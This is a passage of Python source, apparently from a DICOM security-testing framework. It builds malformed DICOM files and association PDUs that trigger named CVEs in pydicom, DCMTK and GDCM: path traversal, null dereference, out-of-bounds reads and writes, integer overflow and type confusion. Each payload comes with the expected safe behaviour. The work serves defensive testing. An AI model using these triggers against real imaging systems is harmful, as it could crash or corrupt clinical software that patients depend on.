            metadata={'cve': 'CVE-2026-32711', 'library': 'pydicom',
                      'fixed_in': '3.0.2 / 2.4.5', 'bug_class': 'path-traversal',
                      'target_field': '(0004,1500) Referenced File ID',
                      'referenced_file_id': ref}
        ))

        # Test 2: absolute-path component (Windows-style) for write/overwrite.
        ref = r'..\..\..\..\Windows\Temp\c-scare-traversal'
        results.append(AttackResult(
            name='cve_2026_32711_02_windows_escape',
            category='cve',
            payload=_build_dicomdir(ref),
            description='DICOMDIR ReferencedFileID escapes the root toward a '
                        'Windows temp write target',
            expected_behavior='FileSet must reject resolved paths outside the '
                              'File-set root',
            metadata={'cve': 'CVE-2026-32711', 'library': 'pydicom',
                      'fixed_in': '3.0.2 / 2.4.5', 'bug_class': 'path-traversal',
                      'target_field': '(0004,1500) Referenced File ID',
                      'referenced_file_id': ref}
        ))

        # Test 3: deep traversal landing a write in a startup/web-root path.
        ref = r'..\..\..\..\..\..\..\..\tmp\c-scare-traversal'
        results.append(AttackResult(
            name='cve_2026_32711_03_deep_write_target',
            category='cve',
            payload=_build_dicomdir(ref),
            description='DICOMDIR ReferencedFileID with a deep ".." chain to a '
                        'world-writable path for copy()/write()',
            expected_behavior='FileSet must reject resolved paths outside the '
                              'File-set root',
            metadata={'cve': 'CVE-2026-32711', 'library': 'pydicom',
                      'fixed_in': '3.0.2 / 2.4.5', 'bug_class': 'path-traversal',
                      'target_field': '(0004,1500) Referenced File ID',
                      'referenced_file_id': ref}
        ))

        return results

    # -------------------------------------------------------------------------
    # CVE-2022-2121: DCMTK NULL pointer dereference parsing a DICOM file
    # -------------------------------------------------------------------------

    @staticmethod
    def cve_2022_2121_null_deref() -> List[AttackResult]:
        """
        CVE-2022-2121: NULL pointer dereference in DCMTK (< 3.6.7) while
        processing a malformed DICOM file — a denial-of-service.

        Structural triggers: datasets that steer the parser onto a code path
        that dereferences an element/sequence pointer the file never actually
        provides. Deliverable as a file (DAST) or DCMTK parse-track seed.
        """
        results = []

        # Test 1: SQ element with a defined length of 0 — an empty sequence
        # where the parser may dereference the (absent) first item.
        ds = Dataset()
        ds / Element(0x0008, 0x1115, 'SQ', b'')   # Referenced Series Sequence, empty
        payload = DicomFile.build(
            ds.encode(implicit_vr=False),
            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
        )
        results.append(AttackResult(
            name='cve_2022_2121_01_empty_defined_sequence',
            category='cve',
            payload=payload,
            description='Zero-length defined SQ where an item is expected',
            expected_behavior='Parser must null-check before dereferencing the '
                              'first sequence item',
            metadata={'cve': 'CVE-2022-2121', 'product': 'DCMTK',
                      'delivery_hint': 'cstore',
                      'structural_trigger': True, 'bug_class': 'null-deref'}
        ))

        # Test 2: pixel-data SQ (encapsulated) with no Basic Offset Table item —
        # codecs that assume a BOT pointer may dereference null.
        data = struct.pack('<HH', 0x7FE0, 0x0010) + b'OB' + b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)        # undefined length (encapsulated)
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)   # sequence delim — no BOT, no fragments
        data += struct.pack('<I', 0)
        payload = DicomFile.build(
            data, sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
            transfer_syntax_uid='1.2.840.10008.1.2.4.50',  # JPEG Baseline (encapsulated)
        )
        results.append(AttackResult(
            name='cve_2022_2121_02_encapsulated_no_bot',
            category='cve',
            payload=payload,
            description='Encapsulated Pixel Data with neither Basic Offset Table '
                        'nor fragments',
            expected_behavior='Codec must null-check the offset table / first '
                              'fragment',
            metadata={'cve': 'CVE-2022-2121', 'product': 'DCMTK',
                      'delivery_hint': 'cstore',
                      'structural_trigger': True, 'bug_class': 'null-deref'}
        ))

        return results

    # -------------------------------------------------------------------------
    # CVE-2025-14607: DCMTK DcmByteString::makeDicomByteString m
    # -------------------------------------------------------------------------

    @staticmethod
    def cve_2025_14607_bytestring_corruption() -> List[AttackResult]:
        """
        CVE-2025-14607: memory corruption in
        ``DcmByteString::makeDicomByteString`` (dcmdata/libsrc/dcbytstr.cc),
        DCMTK <= 3.6.9. Reached through any byte-string VR element (CS, LO, SH,
        PN, UI, DA, TM, ...) whose declared length is pathological — the
        normalize/pad step then writes out of bounds.

        File-deliverable (DAST) and a DCMTK parse-track seed.
        """
        results = []

        # Test 1: byte-string VR (LO) lying about a huge length (long form).
        ds = Dataset()
        ds._force_append(Element.raw(tag=0x00081030, vr=b'LO', value=b'A',
                                     length=0xFFFFFFFE))  # Study Description
        payload = DicomFile.build(
            ds.encode(implicit_vr=False),
            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
        )
        results.append(AttackResult(
            name='cve_2025_14607_01_huge_lo_length',
            category='cve',
            payload=payload,
            description='Study Description (LO) declaring a near-UINT32_MAX length',
            expected_behavior='String normalisation must bound-check the declared '
                              'length',
            metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
                      'delivery_hint': 'cstore',
                      'bug_class': 'memory-corruption',
                      'target_func': 'DcmByteString::makeDicomByteString'}
        ))

        # Test 2: odd-length CS value — makeDicomByteString pads odd lengths to
        # even; a crafted odd length stresses that write.
        ds = Dataset()
        ds._force_append(Element.raw(tag=0x00080060, vr=b'CS', value=b'ABC',
                                     length=3))  # Modality, odd declared length
        payload = DicomFile.build(
            ds.encode(implicit_vr=False),
            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
        )
        results.append(AttackResult(
            name='cve_2025_14607_02_odd_length_cs',
            category='cve',
            payload=payload,
            description='Modality (CS) with an odd declared length triggering '
                        'pad-to-even',
            expected_behavior='Padding logic must not write past the buffer',
            metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
                      'delivery_hint': 'cstore',
                      'bug_class': 'memory-corruption',
                      'target_func': 'DcmByteString::makeDicomByteString'}
        ))

        # Test 3: PN value packed with separators and an over-declared length.
        ds = Dataset()
        ds._force_append(Element.raw(tag=0x00100010, vr=b'PN',
                                     value=b'A^B^C^D^E', length=0xFFFE))
        payload = DicomFile.build(
            ds.encode(implicit_vr=False),
            sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
        )
        results.append(AttackResult(
            name='cve_2025_14607_03_pn_overdeclared',
            category='cve',
            payload=payload,
            description='Patient Name (PN) over-declaring its length',
            expected_behavior='String normalisation must bound-check the declared '
                              'length',
            metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
                      'delivery_hint': 'cstore',
                      'bug_class': 'memory-corruption',
                      'target_func': 'DcmByteString::makeDicomByteString'}
        ))

        return results

    # -------------------------------------------------------------------------
    # CVE-2024-47796: DCMTK determineMinMax improper array index -> OOB write
    # -------------------------------------------------------------------------

    @staticmethod
    def cve_2024_47796_determine_minmax_oob() -> List[AttackResult]:
        """
        CVE-2024-47796: improper array-index validation in ``determineMinMax``
        (dcmimgle), DCMTK 3.6.8 — a crafted image leads to an out-of-bounds
        write while scanning pixel values for their min/max.

        Structural triggers: inconsistent Bits Allocated / Bits Stored / High
        Bit / pixel-count attributes make the min/max scan index outside the
        pixel buffer. Reached through any dcmimgle front-end (dcm2pnm,
        dcm2img); file-deliverable and a pixel grey-box seed.
        """
        def _img(bits_alloc, bits_stored, high_bit, pixel_repr, rows, cols,
                 pixel_bytes):
            ds = Dataset()
            ds / Element(0x0008, 0x0060, 'CS', 'OT')             # Modality
            ds / Element(0x0028, 0x0002, 'US', 1)                # Samples per Pixel
            ds / Element(0x0028, 0x0004, 'CS', 'MONOCHROME2')    # Photometric
            ds / Element(0x0028, 0x0010, 'US', rows)             # Rows
            ds / Element(0x0028, 0x0011, 'US', cols)             # Columns
            ds / Element(0x0028, 0x0100, 'US', bits_alloc)       # Bits Allocated
            ds / Element(0x0028, 0x0101, 'US', bits_stored)      # Bits Stored
            ds / Element(0x0028, 0x0102, 'US', high_bit)         # High Bit
            ds / Element(0x0028, 0x0103, 'US', pixel_repr)       # Pixel Representation
            ds / Element.raw(tag=0x7FE00010, vr=b'OW', value=pixel_bytes)
            return DicomFile.build(
                ds.encode(implicit_vr=False),
                sop_class_uid=SECONDARY_CAPTURE_SOP_CLASS_UID,
                sop_instance_uid='1.2.3.4.5',
            )

        results = []

        # Test 1: Bits Stored / High Bit exceed Bits Allocated — bit math used
        # to mask each sample indexes outside the value range.
        results.append(AttackResult(
            name='cve_2024_47796_01_bits_exceed_allocated',
            category='cve',
            payload=_img(bits_alloc=8, bits_stored=16, high_bit=31,
                         pixel_repr=1, rows=4, cols=4, pixel_bytes=b'\x80' * 32),
            description='Bits Stored=16 / High Bit=31 with Bits Allocated=8',
            expected_behavior='Renderer must validate bit fields before scanning '
                              'pixel min/max',
            metadata={'cve': 'CVE-2024-47796', 'product': 'DCMTK',
                      'delivery_hint': 'cstore',
                      'structural_trigger': True, 'bug_class': 'oob-write',
                      'target_func': 'determineMinMax'}
        ))

        # Test 2: Rows*Columns claim far more pixels than Pixel Data provides —
        # the min/max scan walks past the end of the buffer.
        results.append(AttackResult(
            name='cve_2024_47796_02_dimensions_exceed_pixels',
            category='cve',
            payload=_img(bits_alloc=16, bits_stored=16, high_bit=15,
                         pixel_repr=0, rows=1024, cols=1024, pixel_bytes=b'\x00' * 16),
            description='Rows*Columns=1M but only 16 bytes of Pixel Data',
            expected_behavior='Renderer must bound the scan by the actual pixel '
                              'buffer length',
            metadata={'cve': 'CVE-2024-47796', 'product': 'DCMTK',
                      'delivery_hint': 'cstore',
                      'structural_trigger': True, 'bug_class': 'oob-write',
                      'target_func': 'determineMinMax'}
        ))

        return results

    # -------------------------------------------------------------------------
    # CVE-2015-8979 (+ CVE-2019-1010228 / CVE-2021-41689): DCMTK dcmnet/DUL
    # string-handling overflow on the wire
    # -------------------------------------------------------------------------

    @staticmethod
    def cve_2015_8979_dul_string_overflow() -> List[AttackResult]:
        """
        CVE-2015-8979: remote buffer overflow in DCMTK's DUL (dcmnet) network
        layer via overlong association fields — the lineage continued in
        CVE-2019-1010228 (association OOB write) and CVE-2021-41689
        (``DU_getStringDOElement`` buffer overflow). These are PDU/DIMSE-side
        string-length bugs: deliver as A-ASSOCIATE PDUs (DAST) or AFLNet seeds.
        """
        results = []

        # Reuse the protocol overlong-AE-title PDU and tag its CVE lineage.
        base = ProtocolAttacks.overlong_ae_title()
        results.append(AttackResult(
            name='cve_2015_8979_01_overlong_ae_title',
            category='cve',
            payload=base.payload,
            description='A-ASSOCIATE-RQ with AE title past the 16-byte field '
                        '(DUL string overflow)',
            expected_behavior='DUL must bound-copy fixed-width association fields',
            metadata={'cve': 'CVE-2015-8979',
                      'related_cve': 'CVE-2019-1010228, CVE-2021-41689',
                      'product': 'DCMTK', 'bug_class': 'buffer-overflow',
                      'target_func': 'DUL / DU_getStringDOElement'}
        ))

        # PDU whose declared length vastly exceeds the bytes that follow — the
        # DUL reader may copy past the receive buffer.
        pkt = DICOM(length=0x7FFFFFFF) / A_ASSOCIATE_RQ(
            called_ae_title='TARGET', calling_ae_title='ATTACKER')
        payload = raw(pkt)
        results.append(AttackResult(
            name='cve_2015_8979_02_oversized_pdu_length',
            category='cve',
            payload=payload,
            description='A-ASSOCIATE-RQ PDU declaring a ~2 GB length',
            expected_behavior='DUL must reconcile the PDU length with bytes '
                              'actually read',
            metadata={'cve': 'CVE-2015-8979',
                      'related_cve': 'CVE-2019-1010228',
                      'product': 'DCMTK', 'bug_class': 'buffer-overflow',
                      'target_func': 'DUL PDU reader'}
        ))

        return results

    # =========================================================================
    # GDCM codec CVEs (Cisco Talos) — crafted-.dcm pixel/codec triggers.
    #
    # GDCM (Grassroots DICOM) underpins a long tail of DICOM viewers and PACS,
    # so each payload is both a faithful GDCM reproduction AND a strong probe
    # for the same bug class in software that embeds GDCM-style codecs. The
    # viewer CVEs that share each class (MicroDicom, Sante, MedDream — whose
    # vendors publish no element-level root cause) are listed in
    # metadata['related_cve'] so a DAST run against those targets is traceable
    # without over-claiming a per-product reproduction.
    # =========================================================================

    @staticmethod
    def _image_part10(dataset_bytes: bytes, transfer_syntax: str,
                      sop_class: str = None) -> bytes:
        """Wrap explicit-VR-LE dataset bytes in a Part-10 file.

        The dataset is always encoded Explicit VR LE (only Pixel Data is
        compressed under an encapsulated transfer syntax), so the meta header
        advertises ``transfer_syntax`` while the element stream stays explicit.
        """
        df = DicomFile()
        df.set_meta(
            sop_class_uid=sop_class or SECONDARY_CAPTURE_SOP_CLASS_UID,
            sop_instance_uid='1.2.3.4.5',
            transfer_syntax=transfer_syntax,
        )
        df.dataset = dataset_bytes
        return df.encode()

    @staticmethod
    def _ds_bytes(elements: List[Element]) -> bytes:
        """Encode a list of Elements as an Explicit VR LE element stream."""
        return b''.join(e.encode(implicit_vr=False, little_endian=True)
                        for e in elements)

    @staticmethod
    def cve_2024_22391_gdcm_lut_setlut() -> List[AttackResult]:
        """
        CVE-2024-22391: heap buffer overflow in GDCM ``LookupTable::SetLUT``
        (fixed in GDCM 3.0.24; TALOS-2024-1924).

        SetLUT copies palette LUT data into a buffer sized from the Palette
        Color LUT Descriptor (0028,110x) without reconciling the descriptor's
        declared entry count / bits-per-entry against the actual LUT Data
        (0028,120x) length. A descriptor that disagrees with its data drives an
        out-of-bounds write. Same shape as the LUT/length-mismatch bugs in
        GDCM-derived viewers.
        """
        EXPLICIT_LE = '1.2.840.10008.1.2.1'
        results = []

        # Descriptor declares 65536 entries (count field 0) at 16 bits, but the
        # Red/Green/Blue LUT Data are only a handful of bytes → SetLUT's sized
        # copy walks off the allocation.
        def _lut_dataset(count_field: int, bits: int, data_len: int) -> bytes:
            desc = struct.pack('<HHH', count_field, 0, bits)
            lut_data = (b'\x41\x42' * data_len)[:max(data_len, 2)]
            elems = [
                Element(0x0028, 0x0002, 'US', 1),                # SamplesPerPixel
                Element(0x0028, 0x0004, 'CS', 'PALETTE COLOR'),  # PhotometricInterp
                Element(0x0028, 0x0010, 'US', 4),                # Rows
                Element(0x0028, 0x0011, 'US', 4),                # Columns
                Element(0x0028, 0x0100, 'US', 8),                # BitsAllocated
                Element(0x0028, 0x0101, 'US', 8),                # BitsStored
                Element(0x0028, 0x0102, 'US', 7),                # HighBit
                Element(0x0028, 0x0103, 'US', 0),                # PixelRepresentation
                Element(0x0028, 0x1101, 'US', desc),             # Red LUT Descriptor
                Element(0x0028, 0x1102, 'US', desc),             # Green LUT Descriptor
                Element(0x0028, 0x1103, 'US', desc),             # Blue LUT Descriptor
                Element.raw(tag=0x00281201, vr='OW', value=lut_data),  # Red LUT Data
                Element.raw(tag=0x00281202, vr='OW', value=lut_data),  # Green LUT Data
                Element.raw(tag=0x00281203, vr='OW', value=lut_data),  # Blue LUT Data
                Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 32),
            ]
            return CVEAttacks._ds_bytes(elems)

        results.append(AttackResult(
            name='cve_2024_22391_01_lut_descriptor_count_mismatch',
            category='cve',
            payload=CVEAttacks._image_part10(_lut_dataset(0x0000, 16, 4), EXPLICIT_LE),
            description='Palette Color LUT Descriptor declares 65536 16-bit '
                        'entries; LUT Data is 8 bytes',
            expected_behavior='SetLUT must size the copy from the actual LUT '
                              'Data length, not the descriptor',
            metadata={'cve': 'CVE-2024-22391', 'library': 'GDCM',
                      'bug_class': 'lut-bounds', 'target_func': 'LookupTable::SetLUT',
                      'target_field': '(0028,1101) Palette Color LUT Descriptor',
                      'related_cve': 'CVE-2024-25578'}
        ))

        # Descriptor says 8-bit entries but data is laid out for 16-bit (twice
        # the stride) — a second, independent SetLUT sizing disagreement.
        results.append(AttackResult(
            name='cve_2024_22391_02_lut_bits_stride_mismatch',
            category='cve',
            payload=CVEAttacks._image_part10(_lut_dataset(256, 8, 1024), EXPLICIT_LE),
            description='LUT Descriptor declares 8-bit entries; LUT Data sized '
                        'for 16-bit entries (stride mismatch)',
            expected_behavior='SetLUT must validate bits-per-entry against the '
                              'data length',
            metadata={'cve': 'CVE-2024-22391', 'library': 'GDCM',
                      'bug_class': 'lut-bounds', 'target_func': 'LookupTable::SetLUT',
                      'target_field': '(0028,1101) Palette Color LUT Descriptor'}
        ))

        return results

    @staticmethod
    def cve_2024_25569_gdcm_rawcodec_oob() -> List[AttackResult]:
        """
        CVE-2024-25569: out-of-bounds read in GDCM ``RAWCodec::DecodeBytes``
        (fixed in GDCM 3.0.24; TALOS-2024-1944).

        DecodeBytes ``memcpy``s a length derived from the image geometry
        (Rows × Columns × BitsAllocated/8 × SamplesPerPixel) without checking it
        against the actual Pixel Data (7FE0,0010) length, so an over-declared
        geometry reads past the source buffer. This is the canonical
        dimension-vs-pixeldata mismatch that the MicroDicom / Sante viewer
        memory-corruption CVEs also fall into.
        """
        EXPLICIT_LE = '1.2.840.10008.1.2.1'
        # Geometry implies 0x400 * 0x400 * 2 = 2 MiB; only 64 bytes are present.
        elems = [
            Element(0x0028, 0x0002, 'US', 1),                # SamplesPerPixel
            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),    # PhotometricInterp
            Element(0x0028, 0x0010, 'US', 0x0400),           # Rows
            Element(0x0028, 0x0011, 'US', 0x0400),           # Columns
            Element(0x0028, 0x0100, 'US', 16),               # BitsAllocated
            Element(0x0028, 0x0101, 'US', 16),               # BitsStored
            Element(0x0028, 0x0102, 'US', 15),               # HighBit
            Element(0x0028, 0x0103, 'US', 0),                # PixelRepresentation
            Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 64),
        ]
        return [AttackResult(
            name='cve_2024_25569_01_raw_geometry_exceeds_pixeldata',
            category='cve',
            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
            description='Rows×Columns×BitsAllocated imply 2 MiB but Pixel Data is '
                        '64 bytes (RAW decode reads past the buffer)',
            expected_behavior='RAWCodec must bound the copy by the Pixel Data '
                              'length, not the declared geometry',
            metadata={'cve': 'CVE-2024-25569', 'library': 'GDCM',
                      'bug_class': 'length-mismatch',
                      'target_func': 'RAWCodec::DecodeBytes',
                      'target_field': '(7FE0,0010) Pixel Data vs (0028,0010/0011)',
                      'related_cve': 'CVE-2024-22100, CVE-2025-35975, CVE-2025-36521'}
        )]

    @staticmethod
    def cve_2025_48429_gdcm_rle_numsegments() -> List[AttackResult]:
        """
        CVE-2025-48429: out-of-bounds read in GDCM ``RLECodec::DecodeByStreams``
        (GDCM 3.0.24; TALOS-2025-2214).

        The RLE header is a fixed 64-byte structure: a 32-bit Number-Of-Segments
        followed by 15 32-bit segment offsets (``Offset[15]``). DecodeByStreams
        loops over the declared segment count and indexes ``Offset[]`` — a count
        greater than 15 indexes past the fixed array. We declare 16+ segments.
        """
        RLE_LOSSLESS = '1.2.840.10008.1.2.5'
        results = []

        for n_segments in (16, 0xFFFF):
            # RLE header: NumberOfSegments + 15 offset slots (PS3.5 Annex G).
            header = struct.pack('<I', n_segments)
            header += b''.join(struct.pack('<I', 64 + i * 8) for i in range(15))
            rle_body = header + b'\x00\x80' * 32  # token + literal run filler
            epd = EncapsulatedPixelData(transfer_syntax=RLE_LOSSLESS)
            epd.clear_offset_table()
            epd.add_fragment(rle_body)
            pixel_elem = Element.raw(tag=0x7FE00010, vr='OB',
                                     value=epd.encode(), length=0xFFFFFFFF)
            elems = [
                Element(0x0028, 0x0002, 'US', 1),
                Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
                Element(0x0028, 0x0010, 'US', 8),
                Element(0x0028, 0x0011, 'US', 8),
                Element(0x0028, 0x0100, 'US', 8),
                Element(0x0028, 0x0101, 'US', 8),
                Element(0x0028, 0x0102, 'US', 7),
                Element(0x0028, 0x0103, 'US', 0),
                pixel_elem,
            ]
            results.append(AttackResult(
                name=f'cve_2025_48429_{n_segments:#06x}_rle_numsegments',
                category='cve',
                payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems),
                                                 RLE_LOSSLESS),
                description=f'RLE header declares {n_segments} segments; only 15 '
                            'offset slots exist',
                expected_behavior='RLE decoder must reject NumberOfSegments > 15',
                metadata={'cve': 'CVE-2025-48429', 'library': 'GDCM',
                          'bug_class': 'oob-read',
                          'target_func': 'RLECodec::DecodeByStreams',
                          'target_field': 'RLE header NumberOfSegments'}
            ))

        return results

    @staticmethod
    def cve_2024_22373_gdcm_jpeg2000_oob() -> List[AttackResult]:
        """
        CVE-2024-22373: out-of-bounds write in GDCM
        ``JPEG2000Codec::DecodeByStreamsCommon`` (GDCM 3.0.23; fixed 3.0.24;
        TALOS-2024-1935).

        The decoder trusts the JPEG 2000 codestream's own SIZ dimensions over
        the DICOM header's Rows/Columns. A codestream whose SIZ Xsiz/Ysiz exceed
        the header geometry decodes more samples than the header-sized buffer
        holds → OOB write.
        """
        JPEG2000 = '1.2.840.10008.1.2.4.90'  # JPEG 2000 Image Compression (Lossless)

        # Minimal J2K codestream: SOC + SIZ marker with oversized Xsiz/Ysiz.
        soc = b'\xFF\x4F'
        # SIZ (FF51): Lsiz, Rsiz, Xsiz, Ysiz, XOsiz, YOsiz, XTsiz, YTsiz,
        # XTOsiz, YTOsiz, Csiz, then one component (Ssiz, XRsiz, YRsiz).
        siz_body = struct.pack('>H', 0)            # Rsiz
        siz_body += struct.pack('>I', 0x00010000)  # Xsiz = 65536 (>> header 16)
        siz_body += struct.pack('>I', 0x00010000)  # Ysiz = 65536
        siz_body += struct.pack('>IIII', 0, 0, 0x00010000, 0x00010000)  # offsets/tiles
        siz_body += struct.pack('>II', 0, 0)       # XTOsiz, YTOsiz
        siz_body += struct.pack('>H', 1)           # Csiz = 1 component
        siz_body += bytes([7, 1, 1])               # Ssiz(8-bit), XRsiz, YRsiz
        siz = b'\xFF\x51' + struct.pack('>H', len(siz_body) + 2) + siz_body
        codestream = soc + siz + b'\xFF\xD9'       # ... EOC

        epd = EncapsulatedPixelData(transfer_syntax=JPEG2000)
        epd.clear_offset_table()
        epd.add_fragment(codestream)
        pixel_elem = Element.raw(tag=0x7FE00010, vr='OB',
                                 value=epd.encode(), length=0xFFFFFFFF)
        elems = [
            Element(0x0028, 0x0002, 'US', 1),
            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
            Element(0x0028, 0x0010, 'US', 16),   # header Rows  = 16
            Element(0x0028, 0x0011, 'US', 16),   # header Cols  = 16
            Element(0x0028, 0x0100, 'US', 8),
            Element(0x0028, 0x0101, 'US', 8),
            Element(0x0028, 0x0102, 'US', 7),
            Element(0x0028, 0x0103, 'US', 0),
            pixel_elem,
        ]
        return [AttackResult(
            name='cve_2024_22373_01_jpeg2000_siz_exceeds_header',
            category='cve',
            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), JPEG2000),
            description='JPEG 2000 SIZ declares 65536×65536; DICOM header is '
                        '16×16 (decode overruns the header-sized buffer)',
            expected_behavior='Decoder must reconcile SIZ dimensions with the '
                              'DICOM Rows/Columns before allocating',
            metadata={'cve': 'CVE-2024-22373', 'library': 'GDCM',
                      'bug_class': 'oob-write',
                      'target_func': 'JPEG2000Codec::DecodeByStreamsCommon',
                      'target_field': 'JPEG2000 SIZ Xsiz/Ysiz vs (0028,0010/0011)'}
        )]

    @staticmethod
    def cve_2025_52582_gdcm_overlay_oob() -> List[AttackResult]:
        """
        CVE-2025-52582: out-of-bounds read in GDCM
        ``Overlay::GrabOverlayFromPixelData`` (GDCM 3.0.24; TALOS-2025-2211).

        When an overlay is embedded in the high bits of Pixel Data, GDCM walks
        ``end = array + ovlength * 8`` from Overlay Rows/Columns (60xx,0010/0011)
        without checking that ``ovlength`` fits the actual pixel buffer, so an
        over-declared overlay geometry reads past the allocation.
        """
        EXPLICIT_LE = '1.2.840.10008.1.2.1'
        elems = [
            Element(0x0028, 0x0002, 'US', 1),
            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
            Element(0x0028, 0x0010, 'US', 8),                # Rows
            Element(0x0028, 0x0011, 'US', 8),                # Columns
            Element(0x0028, 0x0100, 'US', 16),               # BitsAllocated
            Element(0x0028, 0x0101, 'US', 12),               # BitsStored
            Element(0x0028, 0x0102, 'US', 11),               # HighBit
            Element(0x0028, 0x0103, 'US', 0),
            # Overlay group: dims far larger than the 8×8 pixel buffer.
            Element(0x6000, 0x0010, 'US', 0x4000),           # Overlay Rows
            Element(0x6000, 0x0011, 'US', 0x4000),           # Overlay Columns
            Element(0x6000, 0x0040, 'CS', 'G'),              # Overlay Type
            Element(0x6000, 0x0100, 'US', 1),                # Overlay Bits Allocated
            Element(0x6000, 0x0102, 'US', 12),               # Overlay Bit Position
            Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 128),
        ]
        return [AttackResult(
            name='cve_2025_52582_01_overlay_dims_exceed_pixeldata',
            category='cve',
            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
            description='Overlay-in-pixel-data declares 16384×16384 over a 128-'
                        'byte Pixel Data buffer',
            expected_behavior='Overlay extraction must bound by the actual Pixel '
                              'Data length',
            metadata={'cve': 'CVE-2025-52582', 'library': 'GDCM',
                      'bug_class': 'oob-read',
                      'target_func': 'Overlay::GrabOverlayFromPixelData',
                      'target_field': '(6000,0010/0011) Overlay Rows/Columns'}
        )]

    @staticmethod
    def cve_2025_11266_gdcm_encapsulated_fragment_underflow() -> List[AttackResult]:
        """
        CVE-2025-11266: out-of-bounds write in GDCM encapsulated Pixel Data
        fragment handling (≤ 3.0.24; fixed 3.2.2).

        An unsigned-integer underflow in fragment / Basic Offset Table index
        arithmetic (a declared length/offset larger than the data, so
        ``len - offset`` wraps to a huge value) drives a bad index. We pair an
        oversized Basic Offset Table entry with an undersized fragment so the
        BOT-relative arithmetic underflows.
        """
        JPEG_BASELINE = '1.2.840.10008.1.2.4.50'
        epd = EncapsulatedPixelData(transfer_syntax=JPEG_BASELINE)
        # Basic Offset Table claims a fragment at offset 0xFFFFFFF0, far past the
        # single tiny fragment that follows → offset - actual underflows.
        epd.set_offset_table_raw(struct.pack('<I', 0xFFFFFFF0))
        epd.add_fragment(b'\xFF\xD8\xFF\xD9')  # 4-byte "JPEG" SOI+EOI
        pixel_elem = Element.raw(tag=0x7FE00010, vr='OB',
                                 value=epd.encode(), length=0xFFFFFFFF)
        elems = [
            Element(0x0028, 0x0002, 'US', 1),
            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
            Element(0x0028, 0x0010, 'US', 64),
            Element(0x0028, 0x0011, 'US', 64),
            Element(0x0028, 0x0100, 'US', 8),
            Element(0x0028, 0x0101, 'US', 8),
            Element(0x0028, 0x0102, 'US', 7),
            Element(0x0028, 0x0103, 'US', 0),
            pixel_elem,
        ]
        return [AttackResult(
            name='cve_2025_11266_01_bot_offset_underflow',
            category='cve',
            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), JPEG_BASELINE),
            description='Basic Offset Table entry (0xFFFFFFF0) far exceeds the '
                        '4-byte fragment, underflowing index arithmetic',
            expected_behavior='Fragment indexing must use overflow-safe '
                              'arithmetic and validate BOT offsets',
            metadata={'cve': 'CVE-2025-11266', 'library': 'GDCM',
                      'bug_class': 'integer-underflow',
                      'target_field': 'encapsulated Basic Offset Table / fragment'}
        )]

    @staticmethod
    def cve_2015_8396_gdcm_imageregionreader_int_overflow() -> List[AttackResult]:
        """
        CVE-2015-8396: integer overflow in GDCM
        ``ImageRegionReader::ReadIntoBuffer`` (fixed in GDCM 2.6.2).

        The buffer size is computed from the image geometry; geometry whose
        product overflows 32-bit arithmetic yields an undersized allocation that
        is then overrun. Set Rows × Columns × SamplesPerPixel × BitsAllocated/8
        to wrap past 2^32.
        """
        EXPLICIT_LE = '1.2.840.10008.1.2.1'
        elems = [
            Element(0x0028, 0x0002, 'US', 3),                # SamplesPerPixel = 3
            Element(0x0028, 0x0004, 'CS', 'RGB'),
            Element(0x0028, 0x0010, 'US', 0xFFFF),           # Rows
            Element(0x0028, 0x0011, 'US', 0xFFFF),           # Columns
            Element(0x0028, 0x0100, 'US', 16),               # BitsAllocated
            Element(0x0028, 0x0101, 'US', 16),
            Element(0x0028, 0x0102, 'US', 15),
            Element(0x0028, 0x0103, 'US', 0),
            Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 64),
        ]
        return [AttackResult(
            name='cve_2015_8396_01_geometry_size_overflow',
            category='cve',
            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
            description='65535×65535×3×2 byte geometry overflows 32-bit size '
                        'arithmetic',
            expected_behavior='Buffer sizing must use overflow-checked arithmetic',
            metadata={'cve': 'CVE-2015-8396', 'library': 'GDCM',
                      'bug_class': 'integer-overflow',
                      'target_func': 'ImageRegionReader::ReadIntoBuffer',
                      'target_field': '(0028,0010/0011) Rows/Columns'}
        )]

    # -------------------------------------------------------------------------
    # CVE-2024-28130: DCMTK type confusion in dcmpstat softcopy VOI LUT
    # -------------------------------------------------------------------------

    @staticmethod
    def cve_2024_28130_dcmtk_voi_lut_type_confusion() -> List[AttackResult]:
        """
        CVE-2024-28130: incorrect type conversion in DCMTK
        ``DVPSSoftcopyVOI_PList::createFromImage`` (dcmpstat, 3.6.8;
        TALOS-2024-1957).

        The code unconditionally casts the VOI LUT Sequence (0028,3010) element
        to ``DcmSequenceOfItems*``. A file that encodes (0028,3010) with a
        non-sequence VR (e.g. a byte string) makes the cast operate on the wrong
        object type → memory corruption / potential RCE. Faithful trigger:
        emit (0028,3010) as ``LO``/``UN`` rather than ``SQ``.
        """
        EXPLICIT_LE = '1.2.840.10008.1.2.1'
        results = []

        for vr, name, blob in (
            (b'LO', 'lo_string', b'NOT_A_SEQUENCE_OBJECT'),
